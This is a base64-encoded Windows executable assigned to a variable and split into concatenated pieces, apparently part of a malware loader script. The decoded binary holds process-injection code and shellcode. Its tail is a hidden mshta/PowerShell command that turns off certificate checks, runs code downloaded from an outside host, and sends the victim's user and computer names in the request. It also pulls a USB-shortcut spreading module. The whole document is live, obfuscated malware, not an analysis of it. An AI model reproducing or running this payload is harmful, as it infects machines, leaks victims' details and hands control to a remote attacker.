wB69blue6_bin_b64=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m5GW/Zn4mZCQl/2b+ZmQk5eRkZj4+ZOX+ZaZlvyX+JCfkvz4/ZKRm/mY/JH8mP2emf2ZnpObk/iR+JKZmZCblvn9/ZuW/Pz8npeY+JuRnpCX+fmfn/35k5KXm/yWl/iXkJb9l56QkZuZ/Pz4n5b9mZeT+JKTmJL9kpb4lpeW/P34+ZH5l5Cfkfib+Z+QkpiWm5afk5KQkP2XmPiR+JeQn/n9kpebmZGQ/P2ekpuS/JuT/Z6Q+ZefmJGfnv38l5mYlviXkfmQkpH8/JiSmJH5/J+W+JiYm5/5k5v4npGW/ZuR+Pz5npeYn/mWm/2SkPmW/JeYkpaR+ZiWlvmWl5iTl/ye/J/9mZ6enpuQl5GZkpD8+f2fnpf9/JH9/Jeb/ZaX'+'npGQm5n9mJmQl5uTn/mQkpeR/JL4k/z5n5/4+ZiZkvz4kPiXk5f4+J+SnpaZlpKY+Zf9npaelpGYkPme/ZmXlpP9/J6Wn/z4k5aW+ZGZlpmQlpmR+Z6fmZORkJ+ek5ue/fj8+f2SlpaY+Zefkv2bkZj4k5eX+Zf9mJOQkJb9n5/9kZOem/yS+JmQ/JuWlpeekZuSnp6emZeS/Z6Ymfj4mJOYlp+Wk5mQl5iW+fiXk/mYm5b8+fn8mZuZl/mRl5/8/ZH9nvmQ/PmbkJOYl/yXk/me/Pj8+ZL9mJL5+JOSkpH9np6ekZmW/Z+Rn5mTl5OSmPj5+ZKemZeflpKQmZv4k/j4/JaXn5ObkfmQ+Zv8l5KQmJOWkP2XkJmWl/ye+JaYk/n8/f2Tnpv9l5+X+ZiX+ZH9/JOYk5b5+JCT/f34/PiQ/JaX/JGYn5KTnpuXkp78n/ye+JmQkJeQm5OT/JKYl/yYnpKfnpGbkZv4kpD8kZf9mJOS/PmQkpD9mZeS+P2Qm5P8lpP4mZuT+JuZm5OflpKQ+P2f+J+b/JmenpOY+ZaS/fmbn5P9/fySk5+bk5aflpmXm5CXmZ+W/fmW+Z6elvmQn5b4mP2WnpGSlv2e/Zmel5Ce+Pmb/f2Q/Jeel/yZ/JCe/ZH9/JaSnpifl5+W+Z/8nvyQn/j4n5v9/ZiTm/mekviQ/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VbXNodGEgdmJzY3JpcHQ6Y3JlYXRlb2JqZWN0KCJ3c2NyaXB0LnNoZWxsIikucnVuKCJjbWQgL2MgcG93ZXJzaGVsbCAtdyBoaWRkZW4gW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2s9ezF9O0lFYHgoTmVgdy1PYmpgZWN0IE5ldC5XZWJDYGxpZW50KS5Eb3duTG9hZFN0cmluZygnaHR0cHM6Ly90Lm03bicrJzB5LmNvbS83cC5waHA/Mi4wKnVzYl9sbmsqJXVzZXJuYW1lJSolY29tcHV0ZXJuYW1lJSonK1tFbnZpcm9ubWVudF06Ok9TVmVyc2lvbi52ZXJzaW9uLk1ham9yKTticHUgKCdodHRwczovL3QubTduJysnMHkuY29tL3V'+'zYi5qc3A/bG5rXzIuMCcpIiwwKSh3aW5kb3cuY2xvc2UpANgwrGsAA